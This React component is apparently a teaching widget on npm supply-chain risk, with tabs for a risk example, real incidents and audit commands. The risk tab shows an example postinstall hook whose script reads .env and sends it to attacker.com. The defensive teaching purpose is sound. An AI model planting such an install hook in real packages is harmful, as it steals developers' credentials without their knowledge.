'use client'

import { useState } from 'react'
import { CodeBox } from './code-box'

export function DependenciesDemo() {
  const [activeTab, setActiveTab] = useState<'risk' | 'cases' | 'audit'>('risk')

  return (
    <div className="my-8">
      {/* Tabs */}
      <div className="flex gap-1 mb-4 flex-wrap">
        <button
          onClick={() => setActiveTab('risk')}
          className={`px-4 py-2 text-sm font-medium rounded-lg transition-colors text-gray-1100 dark:text-gray-1100 ${
            activeTab === 'risk'
              ? 'bg-gray-300 dark:bg-gray-200'
              : 'hover:bg-gray-300/50 dark:hover:bg-gray-200/50'
          }`}
        >
          ❌ Risk
        </button>
        <button
          onClick={() => setActiveTab('cases')}
          className={`px-4 py-2 text-sm font-medium rounded-lg transition-colors text-gray-1100 dark:text-gray-1100 ${
            activeTab === 'cases'
              ? 'bg-gray-300 dark:bg-gray-200'
              : 'hover:bg-gray-300/50 dark:hover:bg-gray-200/50'
          }`}
        >
          ⚠️ Real Cases
        </button>
        <button
          onClick={() => setActiveTab('audit')}
          className={`px-4 py-2 text-sm font-medium rounded-lg transition-colors text-gray-1100 dark:text-gray-1100 ${
            activeTab === 'audit'
              ? 'bg-gray-300 dark:bg-gray-200'
              : 'hover:bg-gray-300/50 dark:hover:bg-gray-200/50'
          }`}
        >
          ✅ Audit
        </button>
      </div>

      {/* Content - min-height prevents layout shift */}
      <div className="min-h-[420px]">
        {activeTab === 'risk' && (
          <div className="space-y-4">
            <CodeBox title="Malicious package.json" language="javascript">
{`{
  "name": "malicious-package",
  "scripts": {
    "postinstall": "node steal-secrets.js"
  }
}

// steal-secrets.js
const fs = require('fs')
const https = require('https')

// Steals .env and sends to attacker's server
const secrets = fs.readFileSync('.env', 'utf8')
https.get(\`https://attacker.com?data=\${secrets}\`)

// Runs AUTOMATICALLY when you npm install!`}
            </CodeBox>
          </div>
        )}

        {activeTab === 'cases' && (
          <div className="space-y-4">
            <ul className="text-sm text-gray-1100 dark:text-gray-1100 space-y-4">
              <li>
                <span className="font-medium">event-stream (2018)</span>
                <p className="mt-1">2M+ downloads/week. Injected code to steal Bitcoin.</p>
              </li>
              <li>
                <span className="font-medium">ua-parser-js (2021)</span>
                <p className="mt-1">8M+ downloads/week. Installed cryptominer and trojan.</p>
              </li>
              <li>
                <span className="font-medium">node-ipc (2022)</span>
                <p className="mt-1">Author intentionally sabotaged: deleted files from Russian users.</p>
              </li>
            </ul>
          </div>
        )}

        {activeTab === 'audit' && (
          <div className="space-y-4">
            <CodeBox language="bash">
{`# Audit vulnerabilities
npm audit

# Automatically fix
npm audit fix

# View details
npm audit --json

# Ignore scripts during install
npm install --ignore-scripts`}
            </CodeBox>
            <ul className="text-sm text-gray-1100 dark:text-gray-1100 space-y-1 list-disc list-inside ml-2">
              <li>Run <code className="bg-gray-300 dark:bg-gray-200 px-1.5 py-0.5 rounded text-xs font-mono">npm audit</code> regularly</li>
              <li>Use Dependabot or Renovate for automatic updates</li>
              <li>Review dependencies before installing</li>
              <li>Use <code className="bg-gray-300 dark:bg-gray-200 px-1.5 py-0.5 rounded text-xs font-mono">package-lock.json</code> for version locking</li>
            </ul>
          </div>
        )}
      </div>
    </div>
  )
}
